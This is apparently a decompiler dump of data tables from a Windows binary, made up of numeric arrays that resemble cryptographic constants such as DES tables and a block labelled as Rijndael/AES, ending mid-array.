_UNKNOWN unk_140111E00; // weak
unsigned __int8 byte_140112600[384] =
{
  1u,
  1u,
  2u,
  2u,
  4u,
  4u,
  7u,
  7u,
  8u,
  8u,
  11u,
  11u,
  13u,
  13u,
  14u,
  14u,
  16u,
  16u,
  19u,
  19u,
  21u,
  21u,
  22u,
  22u,
  25u,
  25u,
  26u,
  26u,
  28u,
  28u,
  31u,
  31u,
  32u,
  32u,
  35u,
  35u,
  37u,
  37u,
  38u,
  38u,
  41u,
  41u,
  42u,
  42u,
  44u,
  44u,
  47u,
  47u,
  49u,
  49u,
  50u,
  50u,
  52u,
  52u,
  55u,
  55u,
  56u,
  56u,
  59u,
  59u,
  61u,
  61u,
  62u,
  62u,
  64u,
  64u,
  67u,
  67u,
  69u,
  69u,
  70u,
  70u,
  73u,
  73u,
  74u,
  74u,
  76u,
  76u,
  79u,
  79u,
  81u,
  81u,
  82u,
  82u,
  84u,
  84u,
  87u,
  87u,
  88u,
  88u,
  91u,
  91u,
  93u,
  93u,
  94u,
  94u,
  97u,
  97u,
  98u,
  98u,
  100u,
  100u,
  103u,
  103u,
  104u,
  104u,
  107u,
  107u,
  109u,
  109u,
  110u,
  110u,
  112u,
  112u,
  115u,
  115u,
  117u,
  117u,
  118u,
  118u,
  121u,
  121u,
  122u,
  122u,
  124u,
  124u,
  127u,
  127u,
  128u,
  128u,
  131u,
  131u,
  133u,
  133u,
  134u,
  134u,
  137u,
  137u,
  138u,
  138u,
  140u,
  140u,
  143u,
  143u,
  145u,
  145u,
  146u,
  146u,
  148u,
  148u,
  151u,
  151u,
  152u,
  152u,
  155u,
  155u,
  157u,
  157u,
  158u,
  158u,
  161u,
  161u,
  162u,
  162u,
  164u,
  164u,
  167u,
  167u,
  168u,
  168u,
  171u,
  171u,
  173u,
  173u,
  174u,
  174u,
  176u,
  176u,
  179u,
  179u,
  181u,
  181u,
  182u,
  182u,
  185u,
  185u,
  186u,
  186u,
  188u,
  188u,
  191u,
  191u,
  193u,
  193u,
  194u,
  194u,
  196u,
  196u,
  199u,
  199u,
  200u,
  200u,
  203u,
  203u,
  205u,
  205u,
  206u,
  206u,
  208u,
  208u,
  211u,
  211u,
  213u,
  213u,
  214u,
  214u,
  217u,
  217u,
  218u,
  218u,
  220u,
  220u,
  223u,
  223u,
  224u,
  224u,
  227u,
  227u,
  229u,
  229u,
  230u,
  230u,
  233u,
  233u,
  234u,
  234u,
  236u,
  236u,
  239u,
  239u,
  241u,
  241u,
  242u,
  242u,
  244u,
  244u,
  247u,
  247u,
  248u,
  248u,
  251u,
  251u,
  253u,
  253u,
  254u,
  254u,
  1u,
  1u,
  1u,
  1u,
  1u,
  1u,
  1u,
  1u,
  254u,
  254u,
  254u,
  254u,
  254u,
  254u,
  254u,
  254u,
  31u,
  31u,
  31u,
  31u,
  14u,
  14u,
  14u,
  14u,
  224u,
  224u,
  224u,
  224u,
  241u,
  241u,
  241u,
  241u,
  1u,
  254u,
  1u,
  254u,
  1u,
  254u,
  1u,
  254u,
  254u,
  1u,
  254u,
  1u,
  254u,
  1u,
  254u,
  1u,
  31u,
  224u,
  31u,
  224u,
  14u,
  241u,
  14u,
  241u,
  224u,
  31u,
  224u,
  31u,
  241u,
  14u,
  241u,
  14u,
  1u,
  224u,
  1u,
  224u,
  1u,
  241u,
  1u,
  241u,
  224u,
  1u,
  224u,
  1u,
  241u,
  1u,
  241u,
  1u,
  31u,
  254u,
  31u,
  254u,
  14u,
  254u,
  14u,
  254u,
  254u,
  31u,
  254u,
  31u,
  254u,
  14u,
  254u,
  14u,
  1u,
  31u,
  1u,
  31u,
  1u,
  14u,
  1u,
  14u,
  31u,
  1u,
  31u,
  1u,
  14u,
  1u,
  14u,
  1u,
  224u,
  254u,
  224u,
  254u,
  241u,
  254u,
  241u,
  254u,
  254u,
  224u,
  254u,
  224u,
  254u,
  241u,
  254u,
  241u
}; // weak
_DWORD dword_140112780[512] =
{
  0,
  16,
  536870912,
  536870928,
  65536,
  65552,
  536936448,
  536936464,
  2048,
  2064,
  536872960,
  536872976,
  67584,
  67600,
  536938496,
  536938512,
  32,
  48,
  536870944,
  536870960,
  65568,
  65584,
  536936480,
  536936496,
  2080,
  2096,
  536872992,
  536873008,
  67616,
  67632,
  536938528,
  536938544,
  524288,
  524304,
  537395200,
  537395216,
  589824,
  589840,
  537460736,
  537460752,
  526336,
  526352,
  537397248,
  537397264,
  591872,
  591888,
  537462784,
  537462800,
  524320,
  524336,
  537395232,
  537395248,
  589856,
  589872,
  537460768,
  537460784,
  526368,
  526384,
  537397280,
  537397296,
  591904,
  591920,
  537462816,
  537462832,
  0,
  33554432,
  8192,
  33562624,
  2097152,
  35651584,
  2105344,
  35659776,
  4,
  33554436,
  8196,
  33562628,
  2097156,
  35651588,
  2105348,
  35659780,
  1024,
  33555456,
  9216,
  33563648,
  2098176,
  35652608,
  2106368,
  35660800,
  1028,
  33555460,
  9220,
  33563652,
  2098180,
  35652612,
  2106372,
  35660804,
  268435456,
  301989888,
  268443648,
  301998080,
  270532608,
  304087040,
  270540800,
  304095232,
  268435460,
  301989892,
  268443652,
  301998084,
  270532612,
  304087044,
  270540804,
  304095236,
  268436480,
  301990912,
  268444672,
  301999104,
  270533632,
  304088064,
  270541824,
  304096256,
  268436484,
  301990916,
  268444676,
  301999108,
  270533636,
  304088068,
  270541828,
  304096260,
  0,
  1,
  262144,
  262145,
  16777216,
  16777217,
  17039360,
  17039361,
  2,
  3,
  262146,
  262147,
  16777218,
  16777219,
  17039362,
  17039363,
  512,
  513,
  262656,
  262657,
  16777728,
  16777729,
  17039872,
  17039873,
  514,
  515,
  262658,
  262659,
  16777730,
  16777731,
  17039874,
  17039875,
  134217728,
  134217729,
  134479872,
  134479873,
  150994944,
  150994945,
  151257088,
  151257089,
  134217730,
  134217731,
  134479874,
  134479875,
  150994946,
  150994947,
  151257090,
  151257091,
  134218240,
  134218241,
  134480384,
  134480385,
  150995456,
  150995457,
  151257600,
  151257601,
  134218242,
  134218243,
  134480386,
  134480387,
  150995458,
  150995459,
  151257602,
  151257603,
  0,
  1048576,
  256,
  1048832,
  8,
  1048584,
  264,
  1048840,
  4096,
  1052672,
  4352,
  1052928,
  4104,
  1052680,
  4360,
  1052936,
  67108864,
  68157440,
  67109120,
  68157696,
  67108872,
  68157448,
  67109128,
  68157704,
  67112960,
  68161536,
  67113216,
  68161792,
  67112968,
  68161544,
  67113224,
  68161800,
  131072,
  1179648,
  131328,
  1179904,
  131080,
  1179656,
  131336,
  1179912,
  135168,
  1183744,
  135424,
  1184000,
  135176,
  1183752,
  135432,
  1184008,
  67239936,
  68288512,
  67240192,
  68288768,
  67239944,
  68288520,
  67240200,
  68288776,
  67244032,
  68292608,
  67244288,
  68292864,
  67244040,
  68292616,
  67244296,
  68292872,
  0,
  268435456,
  65536,
  268500992,
  4,
  268435460,
  65540,
  268500996,
  536870912,
  805306368,
  536936448,
  805371904,
  536870916,
  805306372,
  536936452,
  805371908,
  1048576,
  269484032,
  1114112,
  269549568,
  1048580,
  269484036,
  1114116,
  269549572,
  537919488,
  806354944,
  537985024,
  806420480,
  537919492,
  806354948,
  537985028,
  806420484,
  4096,
  268439552,
  69632,
  268505088,
  4100,
  268439556,
  69636,
  268505092,
  536875008,
  805310464,
  536940544,
  805376000,
  536875012,
  805310468,
  536940548,
  805376004,
  1052672,
  269488128,
  1118208,
  269553664,
  1052676,
  269488132,
  1118212,
  269553668,
  537923584,
  806359040,
  537989120,
  806424576,
  537923588,
  806359044,
  537989124,
  806424580,
  0,
  134217728,
  8,
  134217736,
  1024,
  134218752,
  1032,
  134218760,
  131072,
  134348800,
  131080,
  134348808,
  132096,
  134349824,
  132104,
  134349832,
  1,
  134217729,
  9,
  134217737,
  1025,
  134218753,
  1033,
  134218761,
  131073,
  134348801,
  131081,
  134348809,
  132097,
  134349825,
  132105,
  134349833,
  33554432,
  167772160,
  33554440,
  167772168,
  33555456,
  167773184,
  33555464,
  167773192,
  33685504,
  167903232,
  33685512,
  167903240,
  33686528,
  167904256,
  33686536,
  167904264,
  33554433,
  167772161,
  33554441,
  167772169,
  33555457,
  167773185,
  33555465,
  167773193,
  33685505,
  167903233,
  33685513,
  167903241,
  33686529,
  167904257,
  33686537,
  167904265,
  0,
  256,
  524288,
  524544,
  16777216,
  16777472,
  17301504,
  17301760,
  16,
  272,
  524304,
  524560,
  16777232,
  16777488,
  17301520,
  17301776,
  2097152,
  2097408,
  2621440,
  2621696,
  18874368,
  18874624,
  19398656,
  19398912,
  2097168,
  2097424,
  2621456,
  2621712,
  18874384,
  18874640,
  19398672,
  19398928,
  512,
  768,
  524800,
  525056,
  16777728,
  16777984,
  17302016,
  17302272,
  528,
  784,
  524816,
  525072,
  16777744,
  16778000,
  17302032,
  17302288,
  2097664,
  2097920,
  2621952,
  2622208,
  18874880,
  18875136,
  19399168,
  19399424,
  2097680,
  2097936,
  2621968,
  2622224,
  18874896,
  18875152,
  19399184,
  19399440,
  0,
  67108864,
  262144,
  67371008,
  2,
  67108866,
  262146,
  67371010,
  8192,
  67117056,
  270336,
  67379200,
  8194,
  67117058,
  270338,
  67379202,
  32,
  67108896,
  262176,
  67371040,
  34,
  67108898,
  262178,
  67371042,
  8224,
  67117088,
  270368,
  67379232,
  8226,
  67117090,
  270370,
  67379234,
  2048,
  67110912,
  264192,
  67373056,
  2050,
  67110914,
  264194,
  67373058,
  10240,
  67119104,
  272384,
  67381248,
  10242,
  67119106,
  272386,
  67381250,
  2080,
  67110944,
  264224,
  67373088,
  2082,
  67110946,
  264226,
  67373090,
  10272,
  67119136,
  272416,
  67381280,
  10274,
  67119138,
  272418,
  67381282
}; // weak
_UNKNOWN unk_140112F80; // weak
unsigned __int8 byte_140112FC0[256] =
{
  217u,
  120u,
  249u,
  196u,
  25u,
  221u,
  181u,
  237u,
  40u,
  233u,
  253u,
  121u,
  74u,
  160u,
  216u,
  157u,
  198u,
  126u,
  55u,
  131u,
  43u,
  118u,
  83u,
  142u,
  98u,
  76u,
  100u,
  136u,
  68u,
  139u,
  251u,
  162u,
  23u,
  154u,
  89u,
  245u,
  135u,
  179u,
  79u,
  19u,
  97u,
  69u,
  109u,
  141u,
  9u,
  129u,
  125u,
  50u,
  189u,
  143u,
  64u,
  235u,
  134u,
  183u,
  123u,
  11u,
  240u,
  149u,
  33u,
  34u,
  92u,
  107u,
  78u,
  130u,
  84u,
  214u,
  101u,
  147u,
  206u,
  96u,
  178u,
  28u,
  115u,
  86u,
  192u,
  20u,
  167u,
  140u,
  241u,
  220u,
  18u,
  117u,
  202u,
  31u,
  59u,
  190u,
  228u,
  209u,
  66u,
  61u,
  212u,
  48u,
  163u,
  60u,
  182u,
  38u,
  111u,
  191u,
  14u,
  218u,
  70u,
  105u,
  7u,
  87u,
  39u,
  242u,
  29u,
  155u,
  188u,
  148u,
  67u,
  3u,
  248u,
  17u,
  199u,
  246u,
  144u,
  239u,
  62u,
  231u,
  6u,
  195u,
  213u,
  47u,
  200u,
  102u,
  30u,
  215u,
  8u,
  232u,
  234u,
  222u,
  128u,
  82u,
  238u,
  247u,
  132u,
  170u,
  114u,
  172u,
  53u,
  77u,
  106u,
  42u,
  150u,
  26u,
  210u,
  113u,
  90u,
  21u,
  73u,
  116u,
  75u,
  159u,
  208u,
  94u,
  4u,
  24u,
  164u,
  236u,
  194u,
  224u,
  65u,
  110u,
  15u,
  81u,
  203u,
  204u,
  36u,
  145u,
  175u,
  80u,
  161u,
  244u,
  112u,
  57u,
  153u,
  124u,
  58u,
  133u,
  35u,
  184u,
  180u,
  122u,
  252u,
  2u,
  54u,
  91u,
  37u,
  85u,
  151u,
  49u,
  45u,
  93u,
  250u,
  152u,
  227u,
  138u,
  146u,
  174u,
  5u,
  223u,
  41u,
  16u,
  103u,
  108u,
  186u,
  201u,
  211u,
  0u,
  230u,
  207u,
  225u,
  158u,
  168u,
  44u,
  99u,
  22u,
  1u,
  63u,
  88u,
  226u,
  137u,
  169u,
  13u,
  56u,
  52u,
  27u,
  171u,
  51u,
  255u,
  176u,
  187u,
  72u,
  12u,
  95u,
  185u,
  177u,
  205u,
  46u,
  197u,
  243u,
  219u,
  71u,
  229u,
  165u,
  156u,
  119u,
  10u,
  166u,
  32u,
  104u,
  254u,
  127u,
  193u,
  173u
}; // weak
_UNKNOWN unk_1401130C0; // weak
int dword_140114110[256] =
{
  821772500,
  -1616838901,
  1810681135,
  1059425402,
  505495343,
  -1677701677,
  1610868032,
  -811611831,
  -1076580569,
  -2000962123,
  -503103344,
  -1731160459,
  1852023008,
  365126098,
  -1025022435,
  584384398,
  677919599,
  -1065365415,
  -14452280,
  2002735330,
  1136869587,
  -550533546,
  -2005097446,
  -1563247315,
  -1580605226,
  879511577,
  1639411079,
  575934255,
  717107937,
  -1437329813,
  576097850,
  -1563213360,
  1725645000,
  -1484506833,
  5111599,
  767152862,
  -1751892052,
  1251459544,
  1383482551,
  -1242286169,
  -1205028113,
  -682503847,
  1878520045,
  1510570527,
  -2105841456,
  -1863518930,
  582008916,
  -1131521739,
  1265446783,
  1354458274,
  -765048560,
  -1092255443,
  -1221385584,
  -382003809,
  -1265703919,
  1275016285,
  -45759936,
  -1389258945,
  -990457810,
  1442611557,
  -709768531,
  -1582551634,
  -1563117715,
  -1046803376,
  -2011021070,
  208555832,
  -1528512553,
  1331405426,
  1447828783,
  -979610855,
  -1186340012,
  -1337562626,
  -1313428598,
  -955033379,
  1669711173,
  286233437,
  1465092821,
  1782121619,
  -432195616,
  710211251,
  980974943,
  1651941557,
  430374111,
  2051154026,
  704238805,
  -165996399,
  -1150146722,
  -1437564569,
  948965521,
  -961214997,
  -2067281012,
  718756367,
  -2025188313,
  -1563323541,
  718440111,
  -1437150575,
  -678870176,
  1113355533,
  -1816945114,
  410092745,
  1811985197,
  1944238868,
  -1598112708,
  1415722873,
  1682284203,
  1060277122,
  1998114690,
  1503841958,
  82706478,
  -1979811610,
  1068173648,
  845149890,
  -2127020283,
  1768146376,
  1993038550,
  -728140599,
  -904393265,
  940016341,
  -939893514,
  -1966926575,
  904371731,
  1205506512,
  -200306554,
  -1478344290,
  825647681,
  85914773,
  -1437123836,
  1249926541,
  1417871568,
  3287612,
  -1083912737,
  -1168660850,
  1975924523,
  1353700161,
  -1480510859,
  -1856369675,
  1800716203,
  722146342,
  -1421030953,
  1151126914,
  -134483355,
  -1417296397,
  458611604,
  -1428888796,
  -811287233,
  770352098,
  -1642050302,
  -927128148,
  -354462285,
  -708993384,
  -485346894,
  718646636,
  -1790760482,
  -1380039384,
  -663679127,
  -1437480689,
  -1434948618,
  575749918,
  -1437489253,
  718488780,
  2069512688,
  -746783827,
  453416197,
  1106044049,
  -1262275866,
  52586708,
  -916452660,
  -835158419,
  -1083461268,
  1785789304,
  218356169,
  -723568162,
  -535796774,
  1194783844,
  1523787992,
  -1287140202,
  1975193539,
  -1739514885,
  1341901877,
  -1249128598,
  -518059332,
  -1077543350,
  -1492456432,
  -1405528310,
  1057244207,
  1636348243,
  -533104082,
  1462225785,
  -1662303857,
  481089165,
  718503062,
  24497053,
  -962724087,
  -950311440,
  -639942440,
  -334596231,
  1195698900,
  -1323552140,
  -584791138,
  2115785917,
  -267303687,
  -769388879,
  -1770671107,
  -1548994731,
  -730060881,
  1372086093,
  1452307862,
  -1514465818,
  1476592880,
  -905696015,
  18495466,
  -1916818725,
  901398090,
  891748256,
  -1015329527,
  -1137676583,
  -1734007194,
  1447622437,
  -10594659,
  216884176,
  2086908623,
  1879786977,
  -706064143,
  -2052511630,
  -1356874329,
  -735885200,
  -1484321805,
  758861177,
  1121993112,
  215018983,
  642190776,
  -125730484,
  1196255959,
  2081185372,
  -786228903,
  941322904,
  -170724133,
  -1417443757,
  1848581667,
  -2089706338,
  -1114513338,
  -1705622162,
  -600236020,
  550028657,
  -1775511012,
  -504981761,
  -1321096440,
  2093648313,
  443148163,
  46942275,
  -1560820359,
  1117713533,
  1115362972,
  1523183689,
  -577827072,
  1551984063
}; // weak
int dword_140114510[256] =
{
  522195092,
  -284448933,
  1776537470,
  960447360,
  -27144326,
  -289070982,
  1435016340,
  1929119313,
  -1381503111,
  1310552629,
  -715496498,
  -570149190,
  -1715195665,
  1594623892,
  417127293,
  -1579749389,
  -1598738565,
  1508390405,
  -300568428,
  -369108727,
  -599523194,
  -275495847,
  -1165767501,
  -524038661,
  -774225535,
  990456497,
  -107482687,
  -1511600261,
  21106139,
  -454561957,
  631373633,
  -511641594,
  532942976,
  396095098,
  -746928471,
  -27774812,
  -1730245761,
  2011709262,
  2039648873,
  620404603,
  -518797221,
  -1396440957,
  -682609371,
  -135634593,
  1645490516,
  223693667,
  1567101217,
  -932789415,
  1029951347,
  -824036160,
  -724009337,
  1550265121,
  119497089,
  972513919,
  907948164,
  -454338757,
  1613718692,
  -700789348,
  465323573,
  -1635712211,
  654439692,
  -1719371084,
  -1595678855,
  -1167264884,
  277098644,
  624404830,
  -194023426,
  -1577108705,
  546110314,
  -1891267468,
  -639589849,
  1321679412,
  -58175639,
  1045293279,
  -284295032,
  895050893,
  -1975175028,
  494945126,
  1914543101,
  -1517910853,
  -400202957,
  -2075229678,
  311263384,
  -19710028,
  -836236575,
  669096869,
  -710491566,
  -459844419,
  -975809059,
  -345608092,
  2005142349,
  -1581864959,
  -2066012503,
  -524982508,
  569394103,
  -439330720,
  1425027204,
  108000370,
  -1558535853,
  -623098027,
  -1251844673,
  1750473702,
  -2083886188,
  762237499,
  -321977893,
  -1496067910,
  -1233109668,
  -1351112951,
  867476300,
  964413654,
  1591880597,
  1594774276,
  -2115145887,
  552026980,
  -1268903048,
  -568826981,
  -2011389662,
  -1184422191,
  -2142656536,
  582474363,
  1582640421,
  1383256631,
  2043843868,
  -972191412,
  1217180674,
  463797851,
  -1531928725,
  480777679,
  -1576259579,
  -2005803165,
  -1176621109,
  214354409,
  200212307,
  -484358889,
  -1269553099,
  -1620891332,
  -297670871,
  1847405948,
  1342460550,
  510035443,
  -214695482,
  815934613,
  833030224,
  1620250387,
  1945732119,
  -1591306151,
  -328967100,
  1388869545,
  -838913114,
  -1607788735,
  2092620194,
  562037615,
  1356438536,
  -885045151,
  -1033119899,
  1688467115,
  -2144065930,
  631725691,
  -454635012,
  549916902,
  -839862656,
  394546491,
  837744717,
  2114462948,
  751520235,
  -2073412690,
  -1879607160,
  -295870218,
  2063029875,
  803036379,
  -1592380991,
  821456707,
  -1275401132,
  360699898,
  -276465204,
  -783098280,
  -617611938,
  -1892495847,
  812317050,
  49299192,
  -1724802347,
  -1035798001,
  -1478235216,
  -963753722,
  -1193663732,
  -2138951640,
  -589368376,
  -748703375,
  143268808,
  -1094662816,
  1638124008,
  -1129777843,
  -953159686,
  578956953,
  -2100989772,
  -656847223,
  -1961085764,
  807278310,
  658237817,
  -1325405530,
  1641658566,
  11683945,
  -1207972289,
  148645947,
  1138423386,
  -136210536,
  1981396783,
  -1893950556,
  -595183712,
  380097457,
  -1614572617,
  -1491898645,
  -960707010,
  441530178,
  -278386500,
  1375954390,
  761952171,
  891809099,
  -2111843818,
  157052462,
  -611126533,
  1592404427,
  341349109,
  -1856483457,
  1417898363,
  644327628,
  -2061934520,
  -1941197590,
  -2093457196,
  220455161,
  1815641738,
  182899273,
  -1299947508,
  -667585763,
  -592329145,
  -1404283158,
  1052606899,
  588164016,
  1681439879,
  -256527878,
  -1889623373,
  -65518014,
  167996282,
  1336969661,
  1688053129,
  -1555742370,
  1543734051,
  1046297529,
  1138201970,
  2121126012,
  115334942,
  1819067631,
  1902159161,
  1941945968,
  -2088274427,
  1159982321
}; // weak
int dword_140114910[256] =
{
  -1913667008,
  637164959,
  -342868545,
  -401553145,
  1197506559,
  916448331,
  -1944074684,
  -1362179440,
  -1095632449,
  -285488406,
  -389080752,
  1373570990,
  -1844541434,
  -257096376,
  -516125309,
  -1838149419,
  286293407,
  124026297,
  -1293687596,
  1028597854,
  -1179670496,
  -86080800,
  -1603852661,
  -2106427090,
  1430237888,
  1218109995,
  -722495596,
  308166588,
  570424558,
  -2107958275,
  -1839872531,
  307733056,
  1310360322,
  -1159692289,
  1384269543,
  -1906895858,
  863238079,
  -1935703672,
  -1493414168,
  -914180699,
  -1463804489,
  1470087780,
  1728663345,
  -222478497,
  1090516929,
  532123132,
  -1905536319,
  1132193179,
  -1716503105,
  -1243888053,
  1670234342,
  1434557849,
  -1583888356,
  1241591150,
  -980923864,
  -859607183,
  -1203518957,
  1812415473,
  -2096527044,
  267246943,
  796911696,
  -675250306,
  38830015,
  1526438404,
  -1488465200,
  374413614,
  -1351565506,
  1489179520,
  1603809326,
  1920779204,
  168801282,
  260042626,
  -1936261715,
  1563175598,
  -1897293239,
  1356499128,
  -2077756256,
  514611088,
  2037363785,
  -2108498923,
  -272794213,
  -1502455427,
  -1381482280,
  1173701892,
  -94538749,
  -398540027,
  1334932762,
  -1839830590,
  602925377,
  -1459359442,
  1613172210,
  41346230,
  -1795332748,
  -1837529678,
  -2106139701,
  41386358,
  -122711667,
  1313404830,
  -1889440289,
  -492993522,
  -2077262461,
  873260488,
  -1766082942,
  -1816874680,
  -282051413,
  -1739608280,
  2006953883,
  -1831053811,
  575479328,
  -2076726648,
  2099895446,
  660001756,
  -1953465106,
  -1256205760,
  -406815517,
  -446253919,
  -1008115362,
  1022894237,
  1620365795,
  -845372607,
  1551255054,
  15374395,
  -724141951,
  -45656276,
  -143856167,
  -1113054564,
  310226346,
  1133119310,
  530038928,
  136043402,
  -1818198338,
  -1187460587,
  -1750057729,
  1036173560,
  -1927630100,
  1681395281,
  1758231547,
  -653318264,
  306774401,
  1575354324,
  -578881430,
  1990386196,
  -1180433560,
  -1839360625,
  1262092282,
  -1170624791,
  -1526738165,
  -84438213,
  1833535011,
  423410938,
  660763973,
  -2107837318,
  1639812000,
  -786545967,
  -827521804,
  310289298,
  272797111,
  -2106414734,
  -1838103384,
  310240523,
  677093832,
  1013118031,
  901835429,
  -402271695,
  1116285435,
  -1258496126,
  1337354835,
  243122523,
  520626091,
  277223598,
  -50526099,
  -100718455,
  1766575121,
  594173102,
  316590669,
  742362309,
  -758108674,
  -118531946,
  -456174886,
  -1793762457,
  1229605004,
  -1179211764,
  1552908988,
  -1982633147,
  979407927,
  -335492695,
  1148277331,
  176638793,
  -680281024,
  2083809052,
  40992502,
  1340822838,
  -1563414529,
  -759209788,
  -734067776,
  1354035053,
  122129617,
  7215240,
  -1562034347,
  -1176054596,
  -1576763370,
  -1755891661,
  -685736601,
  -569405635,
  1928887091,
  -1412673741,
  1988674909,
  2063640240,
  -1803878399,
  1459647954,
  -105150216,
  -1992162914,
  1113892351,
  -2057108768,
  1927010603,
  -292086935,
  1856122846,
  1594404395,
  -1350934163,
  -439777433,
  -819991598,
  1643104450,
  -240376463,
  -863880766,
  1730235576,
  -1310358575,
  -1210302878,
  2131803598,
  -116761544,
  267404349,
  1617849798,
  1616132681,
  1462223176,
  736725533,
  -1967909064,
  551665188,
  -1349068273,
  1749386277,
  -1719452699,
  1611482493,
  674206544,
  -2093698206,
  -652406496,
  728599968,
  1680547377,
  -1674552832,
  1388111496,
  453204106,
  -138743851,
  1094905244,
  -1540269039,
  -2093859131,
  -537967050,
  -1590442751,
  -372026596,
  -298502269
}; // weak
int dword_140114D10[256] =
{
  -1649212384,
  532081118,
  -1480688657,
  -764173672,
  1246723035,
  1689095255,
  -2058288061,
  -100528431,
  2116582143,
  -435177885,
  157234593,
  2045505824,
  -49963709,
  1687664561,
  -211542173,
  605965023,
  672431967,
  1336064205,
  -918355904,
  214114848,
  -36500688,
  -1062914225,
  489488601,
  605322005,
  -296939238,
  264917351,
  1912574028,
  756637694,
  436560991,
  202637054,
  135989450,
  85393697,
  -2142043904,
  -398565634,
  -1399130888,
  2145855233,
  -759632289,
  115294817,
  -1147233398,
  1922296357,
  -830144545,
  -177108991,
  1037454084,
  -1569774021,
  2127856640,
  1417604070,
  1148013728,
  1827919605,
  642362335,
  -1365194763,
  909348033,
  1346338451,
  -747167647,
  297154785,
  1917849091,
  -133254469,
  -1411362770,
  -326273058,
  1469521537,
  -514889914,
  -919383040,
  1763717519,
  136166297,
  -3996507,
  1295325189,
  2134727907,
  -1496815930,
  1566297257,
  -622039062,
  -1617793135,
  -1622793681,
  965822077,
  -1514181234,
  289653839,
  1133871874,
  -803123477,
  35685304,
  1068898316,
  418943774,
  672553190,
  642281022,
  -1948808592,
  1954014401,
  -1257840516,
  -215152091,
  2030668546,
  -454378623,
  672283427,
  1776201016,
  359975446,
  -544793758,
  555499703,
  -1524982023,
  1324923,
  69110472,
  152125443,
  -1118182190,
  -472820011,
  1340634837,
  798073664,
  1434183902,
  15393959,
  216384236,
  1303690150,
  -413745665,
  -583833172,
  -333991883,
  106373927,
  -1716533072,
  1455997841,
  1801814300,
  1578393881,
  1854262133,
  -1106788350,
  -1036888713,
  -1992297236,
  1539295533,
  -789824731,
  -1216341321,
  -1922221276,
  549938159,
  -1016683012,
  -1674041216,
  181285381,
  -1429646198,
  -324937785,
  68876850,
  488006234,
  1728155692,
  -1686799788,
  836007927,
  -1859735503,
  919367643,
  -955544762,
  -639210936,
  1457871481,
  40520939,
  1380155135,
  797931188,
  234455205,
  -2039165469,
  -304478997,
  397000196,
  739833055,
  -1217101923,
  -1423247436,
  -272413408,
  772369276,
  390177364,
  -441016267,
  557662966,
  740064294,
  1640166671,
  1699928825,
  -759025160,
  622006121,
  -669614174,
  68743880,
  1742502,
  219489963,
  1664179233,
  1577743084,
  1236991741,
  410585305,
  -1928479354,
  823226535,
  1050371084,
  -868347689,
  -708127818,
  212779912,
  -147848735,
  1819446015,
  1911218849,
  530248558,
  -808726225,
  -1042381801,
  -1408778645,
  -884694568,
  -1952772266,
  20547779,
  -1312477238,
  -1262603827,
  -663214074,
  312714466,
  1870521650,
  1493008054,
  -803280640,
  615382978,
  -191295547,
  -1760449851,
  1932181,
  -2098862126,
  278426614,
  6369430,
  -1020422879,
  -1381948929,
  697336853,
  2143000447,
  -1348553765,
  701099306,
  1558357093,
  -1489964244,
  -794148888,
  -1973632879,
  -727831321,
  216290473,
  -703935098,
  23009561,
  1996984579,
  -559924490,
  2024298078,
  -555526433,
  569400510,
  -1955208313,
  -1278933423,
  -1197095953,
  -655444270,
  -450642313,
  -1038793431,
  795471839,
  -1343849733,
  -193936206,
  -203363493,
  -691234698,
  971261452,
  534414648,
  428311343,
  -905940121,
  -1450097416,
  694888862,
  1227866773,
  -1838760277,
  -1251512727,
  -1680613926,
  -545389265,
  -618303460,
  459166190,
  -162323226,
  1794958188,
  51825668,
  -2042355394,
  -1210295856,
  2036672799,
  -858325693,
  1099053433,
  -1825845770,
  -1235762355,
  1323291266,
  2061838604,
  1018778475,
  -2061623042,
  -1741466242,
  334295216,
  -738217102,
  1065731521,
  183467730
}; // weak
int dword_140115110[] = { 2127105028 }; // weak
int dword_140115510[] = { -151351395 }; // weak
int dword_140115910[] = { -2048901095 }; // weak
int dword_140115D10[] = { -501862387 }; // weak
int RijnDael_AES_Base_140116110[256] =
{
  -966564955,
  -126059388,
  -294160487,
  -159679603,
  -855539,
  -697603139,
  -563122255,
  -1849309868,
  1613770832,
  33620227,
  -832084055,
  1445669757,
  -402719207,
  -1244145822,
  1303096294,
  -327780710,
  -1882535355,
  528646813,
  -1983264448,
  -92439161,
  -268764651,
  -1302767125,
  -1907931191,
  -68095989,
  1101901292,
  -1277897625,
  1604494077,
  1169141738,
  597466303,
  1403299063,
  -462261610,
  -1681866661,
  1974974402,
  -503448292,
  1033081774,
  1277568618,
  1815492186,
  2118074177,
  -168298750,
  -2083730353,
  1748251740,
  1369810420,
  -773462732,
  -101584632,
  -495881837,
  -1411852173,
  1647391059,
  706024767,
  134480908,
  -1782069422,
  1176707941,
  -1648114850,
  806885416,
  932615841,
  168101135,
  798661301,
  235341577,
  605164086,
  461406363,
  -538779075,
  -840176858,
  1311188841,
  2142417613,
  -361400929,
  302582043,
  495158174,
  1479289972,
  874125870,
  907746093,
  -596742478,
  -1269146898,
  1537253627,
  -1538108682,
  1983593293,
  -1210657183,
  2108928974,
  1378429307,
  -572267714,
  1580150641,
  327451799,
  -1504488459,
  -1177431704,
  0,
  -1041371860,
  1075847264,
  -469959649,
  2041688520,
  -1235526675,
  -731223362,
  -1916023994,
  1740553945,
  1916352843,
  -1807070498,
  -1739830060,
  -1336387352,
  -2049978550,
  -1143943061,
  -974131414,
  1336584933,
  -302253290,
  -2042412091,
  -1706209833,
  1714631509,
  293963156,
  -1975171633,
  -369493744,
  67240454,
  -25198719,
  -1605349136,
  2017213508,
  631218106,
  1269344483,
  -1571728909,
  1571005438,
  -2143272768,
  93294474,
  1066570413,
  563977660,
  1882732616,
  -235539196,
  1673313503,
  2008463041,
  -1344611723,
  1109467491,
  537923632,
  -436207846,
  -34344178,
  -1076702611,
  -2117218996,
  403442708,
  638784309,
  -1007883217,
  -1101045791,
  899127202,
  -2008791860,
  773265209,
  -1815821225,
  1437050866,
  -58818942,
  2050833735,
  -932944724,
  -1168286233,
  840505643,
  -428641387,
  -1067425632,
  427917720,
  -1638969391,
  -1545806721,
  1143087718,
  1412049534,
  999329963,
  193497219,
  -1941551414,
  -940642775,
  1807268051,
  672404540,
  -1478566279,
  -1134666014,
  369822493,
  -1378100362,
  -606019525,
  1681011286,
  1949973070,
  336202270,
  -1840690725,
  201721354,
  1210328172,
  -1201906460,
  -1614626211,
  -1110191250,
  1135389935,
  -1000185178,
  965841320,
  831886756,
  -739974089,
  -226920053,
  -706222286,
  -1949775805,
  1849112409,
  -630362697,
  26054028,
  -1311386268,
  -1672589614,
  1235855840,
  -663982924,
  -1403627782,
  -202050553,
  -806688219,
  -899324497,
  -193299826,
  1202630377,
  268961816,
